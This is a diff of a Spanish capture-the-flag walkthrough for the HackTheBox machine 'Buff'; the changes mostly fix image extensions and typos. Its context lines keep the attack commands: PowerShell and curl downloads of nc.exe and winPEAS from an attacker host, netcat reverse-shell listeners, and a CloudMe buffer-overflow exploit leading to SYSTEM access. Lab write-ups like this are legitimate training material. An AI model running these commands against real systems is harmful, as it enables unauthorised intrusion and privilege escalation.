@@ -34,7 +34,7 @@ Veamos la pagina web desde el navegador:
 
 indagando un poco en el apartado **contact** nos dice el gestor de contenido y la version:
 
-![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/5.PNG)
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/5.png)
 
 si lo buscamos en google damos con el siguiente enlace:
 
@@ -42,15 +42,15 @@ si lo buscamos en google damos con el siguiente enlace:
 
 lo copiamos y cuando lo ejecutamos nos da una sesion interactiva:
 
-![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/6.PNG)
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/6.png)
 
-![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/7.PNG)
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/7.png)
 
 ```bash
 python exploit.py http://10.10.10.198:8080/
 ```
 
-![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/8.PNG)
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/8.png)
 
 
 con powershell nos vamos a pasar netcat y vamos a establecer una reverse shell:
@@ -67,7 +67,7 @@ powershell -c "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.1
 curl http://10.10.14.16:8000/nc.exe -o nc.exe
 ```
 
-![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/9.PNG)
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/9.png)
 
 nos mandamos una reverse shell a nuestra maquina Kali con previa escucha:
 
@@ -78,9 +78,9 @@ nc -lvnp 4242 #KALI
 ```
 nos ponemos desde la maquina kali a la escuhca en ese puerto y tenemos una sesion, podemos ver la flag:
 
-![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/10.PNG)
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/10.png)
 
-![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/11.PNG)
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/11.png)
 
 ## ELEVACION DE PRIVILEGIOS
 
@@ -90,17 +90,17 @@ vamos a pasarnos el **winPEAS** para ver como podemos escalar privilegios porque
 powershell -c "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.16:8000/winPEASx64.exe', 'C:\xampp\htdocs\gym\upload\winPEASx64.exe')"
 ```
 
-![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/12.PNG)
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/12.png)
 
 lo ejecutamos y vemos que tenemos permisos especiales un en programa llamado **CloudMe** es decir lo podemos correr como el usuario system, vamos a buscarlo en google para saber que es:
 
-![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/13.PNG)
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/13.png)
 
-![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/14.PNG)
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/14.png)
 
 si buscamos sobre que puerto opera ese servicio:
 
-![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/15.PNG)
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/15.png)
 
 ```bash
 searchsploit cloudme
@@ -112,13 +112,13 @@ vemos vulnerabilidades de Buffer Overflow, vamos a usar este en particular:
 searchsploit -m
 ```
 
-![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/16.PNG)
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/16.png)
 
 vamos a usar el 44470, lo descargamos en nuestro equipo local y examinamos:
 
 debemos generar una shellcode y lo manda al puerto 8888 de mnera local:
 
-![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/17.PNG)
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/17.png)
 
 vamos agenerar la carga util: 
 
@@ -157,7 +157,7 @@ si vemos en la maquina kali ya tenemos corriendo algo en el puerto 8888:
 lsof -i:8888
 ```
 
-![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/18.PNG)
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/18.png)
 
 ahora vamos a ejecutar el script con nuestra shellcode y nos colocamos a la escucha en el puerto que establecimos:
 
@@ -173,13 +173,15 @@ rlwrap nc -lvnp 4545
 
 y tenemos una conexion reverse como system:
 
-![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/19.PNG)
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/19.png)
 
 podemos ver las flags:
 
-![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/20.PNG)
+![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/20.png)
 
 **NOTA MENTAL**
+
+#### exportar winpeas result
 
 revisar bien la salida del winPEAS.
 
@@ -189,7 +191,7 @@ Exportarlo con:
 winPEAS.exe cmd > output.txt
 ```
 
-pasartelo a tu equipo por netcat u otro medio y abrirlo con more paraverlo mejor:
+pasartelo a tu equipo por netcat u otro medio y abrirlo con more para verlo mejor:
 
 ```bash
 cat output.txt | more
